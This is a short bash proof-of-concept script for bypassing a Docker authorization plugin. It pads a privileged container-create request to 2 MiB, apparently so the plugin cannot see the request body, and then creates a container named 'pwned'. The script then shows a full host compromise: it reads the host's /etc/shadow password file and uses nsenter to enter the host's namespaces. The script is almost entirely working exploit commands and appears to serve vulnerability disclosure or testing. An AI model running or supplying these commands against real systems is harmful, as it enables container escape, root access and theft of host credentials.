#!/bin/bash
# 1. Baseline: the SHORT request is denied (the plugin sees the body)
echo "=== baseline (short body) ==="
curl -s --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' \
  --data-binary '{"Image":"alpine:3.20","HostConfig":{"Privileged":true}}' \
  'http://localhost/v1.41/containers/create?name=t1'; echo

# 2. The bypass: the SAME request, padded to 2 MiB
echo "=== bypass (padded body) ==="
python3 generate_payload.py
curl -s --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' \
  --data-binary @/tmp/pwn.json \
  'http://localhost/v1.41/containers/create?name=pwned'; echo

# 3. The privileged container is real:
docker start pwned
docker inspect -f 'Privileged={{.HostConfig.Privileged}} Binds={{.HostConfig.Binds}}' pwned
docker exec pwned cat /host/etc/shadow | head -3          # HOST password file
docker exec pwned nsenter -t 1 -m -u -i -n -p -- sh -c 'hostname; id'
